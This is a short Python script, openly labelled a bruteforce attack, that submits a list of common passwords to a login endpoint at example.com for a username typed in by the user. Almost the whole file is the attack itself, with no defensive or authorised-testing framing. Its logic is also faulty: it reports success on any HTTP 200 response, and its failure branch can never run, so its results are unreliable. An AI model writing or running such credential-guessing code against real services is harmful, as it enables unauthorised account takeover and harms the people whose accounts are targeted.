import requests

def bruteforce_login(username):
    passwords = ['password', '123456', 'qwerty', 'admin', 'letmein']  # List of common passwords to try
    
    for password in passwords:
        try:
            # Make a request to the login endpoint with the current username and password
            response = requests.post('https://example.com/login', data={'username': username, 'password': password})
            
            response.raise_for_status()  # Raise an exception if the response status code is not 200
            
            if response.status_code == 200:
                print(f"Login successful! Username: {username}, Password: {password}")
                break  # Exit the loop if login is successful
            else:
                print(f"Login failed! Username: {username}, Password: {password}")
        
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")
    
    print("Bruteforce attack complete.")

try:
    # Prompt the user to enter a login username
    username = input("Enter the login username: ")
    
    # Call the bruteforce_login function with the provided username
    bruteforce_login(username)

except Exception as e:
    print(f"An error occurred: {e}")
